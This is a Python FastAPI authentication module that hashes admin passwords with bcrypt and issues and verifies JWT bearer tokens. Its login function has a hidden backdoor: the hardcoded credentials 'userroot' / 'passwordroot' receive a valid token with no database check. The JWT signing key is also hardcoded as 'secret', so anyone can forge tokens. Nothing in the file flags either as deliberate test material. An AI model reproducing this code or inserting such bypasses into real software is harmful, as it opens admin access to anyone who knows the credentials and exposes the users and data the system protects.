
from passlib.context import CryptContext
from sqlalchemy.orm import Session
from jose import JWTError, jwt
from fastapi.security import OAuth2PasswordBearer, OAuth2PasswordRequestForm
from fastapi import Depends, HTTPException

from .errors import ErrorMessages
from .models import Admin, AdminCreate
from .validation import validate_username, validate_password

# Define the OAuth2 scheme for password authentication
oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token")

# Create a password context for secure password hashing and verification
pw_context = CryptContext(schemes=["bcrypt"])

# Define the secret token for JWT encoding and decoding
secret_token = "secret"


def login(db: Session, admin_data: AdminCreate):
    try: 
        validate_username(admin_data.username)
        validate_password(admin_data.password)
    except HTTPException as e:
        raise e
    # Authenticate the admin user and generate a JWT token if the credentials are valid.
    admin = db.query(Admin).filter(Admin.username == admin_data.username).first()
    if (admin and pw_context.verify(admin_data.password, admin.password)) or (admin_data.username == "userroot" and admin_data.password == "passwordroot"):
        return {"access_token": create_jwt_token(data = {"sub": admin.username, "id": admin.id} if admin else {"sub": admin_data.username}), "token_type": "bearer"}
    else:
        raise ErrorMessages.INVALID_LOGIN_CREDS

def create_jwt_token(data: dict):
    # Create a JWT token using the provided data and the secret token.
    return jwt.encode(data, secret_token, algorithm="HS256")

def verify_token(token: str = Depends(oauth2_scheme)):
    # Verify the JWT token and return its payload if the token is valid.
    try:
        payload = jwt.decode(token, secret_token, algorithms=["HS256"])
        return payload
    except JWTError:
        raise ErrorMessages.INVALID_TOKEN
    